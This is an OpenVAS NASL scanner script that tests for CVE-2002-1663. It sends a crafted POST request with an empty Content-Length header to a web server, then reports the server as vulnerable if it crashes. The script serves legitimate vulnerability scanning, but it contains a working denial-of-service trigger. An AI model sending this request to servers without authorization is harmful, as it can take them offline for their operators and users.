# OpenVAS Vulnerability Test
# $Id: monkeyweb_post_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: POST with empty Content-Length
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Your web server crashes when it receives an incorrect POST
command with an empty 'Content-Length:' field.

A cracker may use this bug to disable your server, preventing 
it from publishing your information.";

tag_solution = "Upgrade your web server.";

# Ref:
# From: Daniel <keziah@uole.com>
# Subject: Bug in Monkey Webserver 0.5.0 or minors versions
# To: bugtraq@securityfocus.com
# Date: Sun, 3 Nov 2002 23:21:42 -0300

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11924");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2002-1663");
 script_bugtraq_id(6096);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 
 name = "POST with empty Content-Length";
 script_name(name);
 
 
 # No use to make an ACT_MIXED_ from this
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl");
 # The listening port in the example configuration file is 2001
 # I suspect that some people might leave it unchanged.
 script_require_ports("Services/www",80, 2001);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);
	# 2001 ?
if(! get_port_state(port)) exit(0);

if (http_is_dead(port:port)) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);
r = http_post(item: "/", port: port, data: "");
r2 = ereg_replace(string: r,
	pattern: 'Content-Length:([ 0-9]+)', replace: 'Content-Length:');
if (r2 == r)	# Did not match?
  r2 = string('POST / HTTP/1.0\r\n',
       'Host: ', get_host_name(), '\r\n',
       'Content-Length:\r\n\r\n');

send(socket: soc, data: r2);
r = http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port))
{
  security_message(port);
  set_kb_item(name:"www/buggy_post_crash", value:TRUE);
}
